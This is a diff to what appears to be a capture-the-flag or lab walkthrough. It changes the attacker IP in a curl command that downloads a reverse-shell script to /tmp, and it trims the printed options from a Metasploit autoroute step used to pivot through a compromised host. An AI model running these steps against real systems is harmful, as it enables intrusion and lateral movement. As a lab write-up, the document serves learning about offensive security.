@@ -31,7 +31,7 @@ Attention to:
 - The output folder,  I choose **/tmp** , because usually there are no permissions problems.
 
 ```
-curl http://10.10.14.220:8080/reverse.sh --output /tmp/shell.sh
+curl http://10.10.14.106:8080/reverse.sh --output /tmp/shell.sh
 ```
 
 Once the file is downloaded, you can shutdown the python server on the attacking machine
@@ -124,20 +124,6 @@ Now we will add the routes from the target machine, the data
 
 ```
 msf6 exploit(multi/handler) > use post/multi/manage/autoroute
-msf6 post(multi/manage/autoroute) > options
-
-Module options (post/multi/manage/autoroute):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
-   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
-   SESSION                   yes       The session to run this module on
-   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
-
-
-View the full module info with the info, or info -d command.
-
 msf6 post(multi/manage/autoroute) > set session 1
 session => 1
 msf6 post(multi/manage/autoroute) > run
